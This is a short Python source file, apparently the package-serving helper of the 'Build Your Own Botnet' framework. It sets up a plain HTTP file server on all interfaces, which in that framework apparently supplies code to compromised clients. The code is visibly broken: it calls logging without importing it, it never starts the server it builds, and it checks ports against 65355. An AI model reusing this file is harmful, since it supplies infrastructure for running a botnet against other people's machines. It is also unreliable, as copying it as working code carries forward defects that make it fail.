#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

from __future__ import print_function

# standard library

import os
import sys
import argparse
import SimpleHTTPServer


logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())


def main():
    try:
        parser = argparse.ArgumentParser(prog='packageHandler.py')
        parser.add_argument('port', type=int, default=1340, help='server port to listen on')
        parser.add_argument('path', type=str, default='.', help='directory path to serve requests from')
        options = parser.parse_args()
        if os.path.isdir(options.path):
            os.chdir(options.path)
            if str(options.port).isdigit() and int(options.port) < 65355 and int(options.port) > 0:
                importer = SimpleHTTPServer.BaseHTTPServer.HTTPServer(('0.0.0.0', options.port), SimpleHTTPServer.SimpleHTTPRequestHandler)
            else:
                logging.debug("Error: invalid port number '{}'".format(options.port))
        else:
            logging.debug("Error: directory path '{}' does not exist".format(options.path))
    except Exception as e:
        logging.debug("Error: {}".format(str(e)))
        

if __name__ == '__main__':
    main()
